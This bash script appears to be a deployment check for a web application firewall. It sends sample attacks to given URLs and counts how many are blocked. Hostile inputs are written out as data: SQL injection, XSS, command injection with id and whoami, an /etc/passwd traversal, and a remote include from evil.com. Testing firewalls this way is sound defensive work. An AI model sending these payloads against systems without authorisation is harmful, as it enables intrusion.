#!/bin/bash

# ─── TEST HELPER ────────────────────────────────────────────────
run_test() {
    NAME=$1
    PAYLOAD=$2
    EXPECT_BLOCK=$3
    URL=$4

    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$URL/?q=$PAYLOAD")

    if [[ "$EXPECT_BLOCK" == "BLOCK" ]]; then
        if [[ "$RESPONSE" == "403" || "$RESPONSE" == "000" ]]; then
            echo "✅ $NAME -> BLOCKED ($RESPONSE)"
            ((PASS++))
        else
            echo "❌ $NAME -> ALLOWED ($RESPONSE)"
            ((FAIL++))
        fi
    else
        if [[ "$RESPONSE" == "200" || "$RESPONSE" == "301" || "$RESPONSE" == "302" ]]; then
            echo "✅ $NAME -> ALLOWED ($RESPONSE)"
            ((PASS++))
        else
            echo "❌ $NAME -> UNEXPECTED BLOCK ($RESPONSE)"
            ((FAIL++))
        fi
    fi
}

# ─── 13-ATTACK SUITE ──────────────────────────────────────────
run_waf_suite() {
    local URL=$1
    local LABEL=$2
    PASS=0
    FAIL=0

    echo "======================================"
    echo " WAF Security Test: $LABEL"
    echo " Target: $URL"
    echo "======================================"

    echo ""
    echo "[1] SQL Injection"
    run_test "SQLi Basic" "1%27%20OR%20%271%27=%271" BLOCK "$URL"
    run_test "SQLi UNION" "%27%20UNION%20SELECT%20NULL--" BLOCK "$URL"
    run_test "SQLi Comment" "1%27--" BLOCK "$URL"

    echo ""
    echo "[2] XSS"
    run_test "XSS Script" "%3Cscript%3Ealert(1)%3C/script%3E" BLOCK "$URL"
    run_test "XSS IMG" "%3Cimg%20src=x%20onerror=alert(1)%3E" BLOCK "$URL"

    echo ""
    echo "[3] Command Injection"
    run_test "CMD ;id" "%3Bid" BLOCK "$URL"
    run_test "CMD && whoami" "%26%26whoami" BLOCK "$URL"
    run_test "CMD subshell" "%24(whoami)" BLOCK "$URL"

    echo ""
    echo "[4] LFI"
    run_test "LFI passwd" "../../../../etc/passwd" BLOCK "$URL"

    echo ""
    echo "[5] RFI"
    run_test "Remote File Include" "http://evil.com/shell.txt" BLOCK "$URL"

    echo ""
    echo "[6] Bad Bot Detection"
    RESP=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: sqlmap" "$URL")
    if [[ "$RESP" == "403" || "$RESP" == "000" ]]; then
        echo "✅ Bad Bot Blocked ($RESP)"
        ((PASS++))
    else
        echo "❌ Bad Bot Allowed ($RESP)"
        ((FAIL++))
    fi

    echo ""
    echo "[7] Large Payload (DoS)"
    RESP=$(curl -s -o /dev/null -w "%{http_code}" "$URL/$(head -c 8000 < /dev/zero | tr '\0' 'A')")
    if [[ "$RESP" == "403" || "$RESP" == "413" || "$RESP" == "414" || "$RESP" == "000" ]]; then
        echo "✅ Large Payload Controlled ($RESP)"
        ((PASS++))
    else
        echo "❌ Large Payload Allowed ($RESP)"
        ((FAIL++))
    fi

    echo ""
    echo "[8] False Positive Check"
    RESP=$(curl -s -o /dev/null -w "%{http_code}" "$URL/")
    if [[ "$RESP" == "200" || "$RESP" == "301" || "$RESP" == "302" ]]; then
        echo "✅ Normal Traffic Allowed ($RESP)"
        ((PASS++))
    else
        echo "❌ Normal Traffic Blocked ($RESP)"
        ((FAIL++))
    fi

    # ─── DOMAIN RESULTS ──────────────────────────────────────────
    echo ""
    echo "======================================"
    echo " RESULTS: $LABEL"
    echo " Score: $PASS/13"
    echo "======================================"

    if [[ $PASS -ge 12 ]]; then
        echo "✅ FULLY PRODUCTION READY"
        echo "STATUS:${LABEL}:PASS:${PASS}/13"
        return 0
    else
        echo "🚨 NOT PRODUCTION READY (Score: $PASS/13)"
        echo "STATUS:${LABEL}:FAIL:${PASS}/13"
        return 1
    fi
}

# ─── ENTRY POINT ──────────────────────────────────────────────
# Defaults
DOMAIN1="${1:-}"
DOMAIN2="${2:-}"

# Fallback for IP-only deployments
if [[ -z "$DOMAIN1" ]]; then
    echo "Error: No domain provided."
    echo "Usage: $0 <domain1_url> [domain2_url]"
    exit 1
fi

OVERALL_EXIT=0

# Test Domain 1
run_waf_suite "$DOMAIN1" "Domain1"
if [[ $? -ne 0 ]]; then OVERALL_EXIT=1; fi

# Test Domain 2 (if provided)
if [[ -n "$DOMAIN2" ]]; then
    echo ""
    run_waf_suite "$DOMAIN2" "Domain2"
    if [[ $? -ne 0 ]]; then OVERALL_EXIT=1; fi
fi

echo ""
echo "======================================"
echo " DEPLOYMENT WAF SUMMARY"
echo "======================================"
if [[ $OVERALL_EXIT -eq 0 ]]; then
    echo "🎉 ALL DOMAINS PRODUCTION READY"
else
    echo "🚨 AT LEAST ONE DOMAIN FAILED WAF TEST"
fi
echo "======================================"

exit $OVERALL_EXIT
